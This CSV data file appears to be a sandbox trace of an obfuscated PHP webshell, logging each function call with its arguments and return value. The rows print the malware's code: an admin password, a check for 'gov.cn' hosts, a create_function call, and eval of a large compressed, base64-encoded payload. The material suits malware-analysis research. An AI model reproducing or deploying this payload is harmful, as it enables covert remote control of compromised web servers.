uuid,file_md5,index,source,target,argc,argv,return,dynamic
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,0,__main__,zend_compile_file,2,{"value": []},{"value": "26262609413C39413C3A413C505142413C2B395051423C3A2A080808080808080808080808080808080808080808080808080808080808082663413C263B41423D263B3D3E"},[]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,1,__main__,error_reporting,1,"{""value"": [[0, ""new_error_level"", 5]]}",{"value": "void"},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,2,__main__,set_time_limit,1,"{""value"": [[0, ""seconds"", 0]]}",{"value": "void"},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,3,__main__,header,1,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=gb2312""]]}",{"value": "void"},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,4,__main__,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,5,__main__,stristr,2,"{""value"": [[0, ""haystack"", ""127.0.0.1:5001""], [1, ""needle"", ""gov.cn""]]}",{"value": false},"[135, 0]"
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,6,__main__,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,7,__main__,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""$password='admin';\r\n$shellname='\\xcd\\xf8\\xd5\\xbe\\xb0\\xb2\\xc8\\xab\\xbc\\xec\\xb2\\xe2';$myurl='http://www.zjjv.com';\r\neval(gzuncompress(base64_decode('\r\neJzsvWlv60qaJvi9gf""]]}",{"value": "\\x00lambda_1"},"[0, 0]"
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,8,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){$password='admin';\r\n$shellname='\\xcd\\xf8\\xd5\\xbe\\xb0\\xb2\\xc8\\xab\\xbc\\xec\\xb2\\xe2';$myurl='http://www.zjjv.com';\r\neval(gzuncompress(base64_decode('\r\neJzsvWlv60qaJvi9gf4PiUIBlYmbqGZwJwo5QJAMStRiyVptDQ\nYJWfd40S4fSZbU6P8+zxMkJcrLOSdvV1ejZ+pWnbQtcYnlXZ53\njf/6X1YPf/++Hb9u//yXf/v92+PL8tuf/2VxHP/+++u379//5a\n///Peu6gxU5//+l27USdu9vydpQ93IpvqX/+dy/Xr1fbse68v5\n4231+vvly+/P3+bz5XjxDd+efy+/a/c6x1f651/+7XG3nGxfVs\ns/tdar20Xnz//c2r6myyfeunr7m/GX//7PrT/97U/bP/3rn17/\n7Z9bAr938Ts+5P/gE7P8yes3/M8en1r4FFf/+fzN+nW1FeO//m\nmNf3+3/oJLbH2JhReaf+alr6uH9SuuvP274fJRj8vWX/+0Mv76\np439l7/wBudvuOnP5VueX2rL1r/K00o0W/9aN1T9XxvG0Ir/yu\nt65uztL/q3Zjx3/sL//u3l8c96WphU2MXTnD//y7/89fqhevL6\nYlyCHfof3+bfv/3312/b3evyT59f+m//43/81/9yXsbaIlr9/u\n389f+Xlu8nq/Bf/0tOQv/0t7/F3++MabhIT+vDzX41T/ub47De\nvjPi795hP+hP+qERmKNh63adHjujZktUJq3xJtqZq0Xc2cy6te\nQUnDaG8TZ4qPaaL7K6uhOL9XHYH26r5voxNUMj7a+N1FodjPxz\nPHd/k0S7m/ZGtPobEfSGD43a0ju010+qP3x4PK0mM8y1ZYST4r\nNqbzVp9uLH9Xyo3zPrrZ+OvXhr3A7Oz398G0y25no37A2M4LR6\nwHwe0/FmG1urcJhE2RyT5mJWawZPlbt9Y9x4GrTv9+V/nbf7qd\n0ePa/fRrObamO/ba8m3dqKazFr7KP5TTae327azSfZG24fK9+3\nj7ev28c+3p1Eo6BT+d7qJvGwfWc6tSbHxnt3qt44DPF8ez94MG\nqN51Z9dVT9QZA/zzsmqjKrxr0W1yW52+t5nAbbafb7i11b7gPc\nq9em19xhLg+D/mYxxL/dvjl5qt9N1tlYx9v52pD1pZ2a9eegtj\nQ03fTuTseanvvwIb7l/KeqfXeU1upRmvW34LSe4rPNcFF7OWI/\nsHcvM7Nx4mfdd58JK8S7wqdGJ0037cFjnMaxMCq3QTcN0879xD\niOVnjvgeNIzeZpN1/Pu73l26zWmMhacyr7K8x5uTXe7rejenOu\n5q/bQ3J5d8NcHZu1wQP26vHYW1o/fV/6x97X/eJ9mDM/f8Q147\nU13E7nw2Orvpxu2ndO98RnD34D3c2nP/5+tk1ed8PxejfLaOXB\nxliCfK2xz9sb7PuhvTQ2p9VxBlqa5tfpfa1tFk5Sf07N5QvoYy\nXrzUW3tnzs9oZBXFu9qeQO67w6PpkrQ81rixT0cuytdthTrMF6\ncezdbTOeKj9/9OEdHAfG9S3obQ6P4Im4X9+CDw7CbBy2+9VUWo\n25stbkswdlNZ/THviMtLZfHVvW6rs0V/OWNXwY4XnH3usxOK6w\ndps3p7Y5kS5TyoBaLk/ad4+zWnzo1pqJU7k/qZwn8d6HuL6JVG\n9TwedHfH5S83Ci59m+e0vxXHxu4fMjPwedP6a95cJpb6bH0/pN\ninS8TSqR7Ays9LQK1pqf7sYGaAR7ssD4J7t687u0sBeg38Z+8D\nIAnx2S0ePNLel10BXVGLRUGTaNerWVJok0qvvHY7XbxD8p6odt\n0nzqnlbzY695XrsP89s3ed0i6K3eWv2YPGYMbkezKT9va549tT\nqDwG4PsnljHRsF/fXi3bagv8VwDPlY0OqEdDiwho/5emAP1i98\nfkPzZGMO2cfnfQfP33yy5s9Yb/L4AfLo+9Bc3WBc3C88Z/McmI\n3vqt4cB8fGC8d2M9cyGvdldFIdr7Hv60W3t9b3xaBn/J09h3SQ\nbOa73mYh641pea0dczVRVuM5HTcp24/gweNx25YGeBl0tQMdvQ\nVd0JNZ3we9mONcqDFk4nj1grGSj/U7Wud1ONPDE8a9OFpfjQfP\nsNaO/GWazOY5qjUpL0GfzQfZ13rlvEfreePIOc16q+POXP+qfN\nX3T/eD59lxAN5fvkx6pfXNfj6WabxlYK/nQ/37D9aSz/egB89j\nBHHJx3FbHs5yZpMEgmNWW/ty7z/9Vfzl386K38ANZLwqBGerPS\nAImBiiCaWqhc0YimRCBaHMFQbU/K7e5BGbvG/NVw8Qqtubvb5/\njAGNgyS7vrUPIQhfDdEuiCseb/fro6phML3BlgM/JFj47cDqVO\nNh01qeJlYc7/pVY3g7+r15XL4N01XkQPHetAf6HVCYt8dqYh2t\n5mEoVCSqNfwdjyf99Wh4kIvRorLfdDeznRFHqtp47lYqz8EhnW\n3M+HYjkm9g6snmUJltasvRsKLeht3KS+c2FA/15d1OVKOdUSm/\na/+0r403VnO0S5cLVU3U0WxYMl11dtVV1DSSLt+966v95ihPm1\n4Sp7WK6h6Wg6D2+iYP2HmjYaxry/la3MW7cdx5qtbUpre8S6ub\n4c66L7/rpVpVL5v+sptWa9ObNO4da3GrW43b3WqVP/lv1O2EcR\nfv7R5isTXiVtBWxXc/+1d+16/e80f//ee7/vNd//mu/3zXf77r\ns3cZmxd/fh9v6nEHQPPFb0O+G7HhJ7F9A5O+W014z3BTi2/x8y\nXmM4zYChL+bF6ea9yfWmms8Ht311t1AkM9tt6qe7sS7Qf1xnxI\n3Xpzv19XcG0nuQ1OzWmzK8ebVFmy9jqUHSmHb+tvT8nr1K5uDP\nuQ7Da1zW4jlq3mcXWfHlaJ6q4fnE441M/a3u+n1bT/VFPd4WLT\naVYrQt1WZ4OuMpVY/y6tUZSaDfepKhfV+uvLRqyjYW8kU7H59m\niqpawl8fGY1Dh2hTEFxTw6ldbuttra4fdhVQ4k1osg5t9pX9wA\na908rOpPScN1OrWdut0MutWRSR0bYO3FaUAQ9TyY3526tZHBcQ\nT75s7pNfvdw+Zbw+R9SWsi7l4ah9H9U6LMddqsNY9pDTr8pTGu\nPU3SVV+YKsL7FPY0wj513u9JtbcyADz13AAEA2OxwfXKbh7y97\nebRtNszibHykv81rAe26+13dty+riX42Glemp1N8tNKu1mJX6Z\n9ipyeIinN/0ajRUrNYCBzGa7azRaR2PdlgK4YLESsFr7EnOeVe\nMF/tkH87y2MIaVDRrrpgdY9TU1S7HvwDDjSW+ZylNizarpfnNo\n9NKxWjwe5O+thfw26SylNBvJr65/QTcdI/v7WNAzcUw1vj2Cni\nXwXLejbPDEC/aE/DHuvsc9xpI/z7inW610su/Vw6ynok1nNR0c\n9Tr+ZrwNxqK2PK/zqK9aQ2PTgTHYb741BDBhczdedWbGqDYUab\ngRG1f1V1aaxtbuNu0rS53pfXRqLh6suCm7qis6yXLYTdSw2pgN\nrLvWLl3PtkItbNDr8LCxNp2k0jVWSi1W8/Vp1JJpVc3Ay0eRKn\nWoLo+1qnnTX8+O1dpiU63ep/WlNTqu+92C/pI0vFo/I1uPfH0k\n5YFa3GfyArgTf4NfNP/r67G/Tf5MsXbpbULZMZTVj/JB7z/ocX\nS7firJCHUs6DCpdlNjGW+MpRoaycvwlPSPnepLI62d0nHNVT1Z\nAz5/DuaN5q43+tY51eKgvXEmpnwYjivt42Gd7vrLu25veX88rs\naq3ngLasroVFcP6khDpIK5VQo6tDE/0O1GNatpW6Zq36pjvGbz\nPhWVtjA2g93t6iCPr3fdzqgFTCy648pMGOtwaK5v8dkBn00Dg2\nuzrP2UDv9nZAnkNu6HHMZiGZuW6oTcCzfY16KJdf/kdBRkRKWz\nOe8n5LeW19Un3r9bJHvYRU/OYfmwqWLtbl8HrYzetT7YfdxP/l\n3eT5X+YD+ntZVd7KexWIM/4vR4WoWTXu""]]}",{"value": "003E"},[0]
db26f9a972dfd62672ef0b25c8862f19,99f33490e4a293d157381965682ae0a1,9,__main__,__lambda_func,0,{"value": []},{"value": null},[]
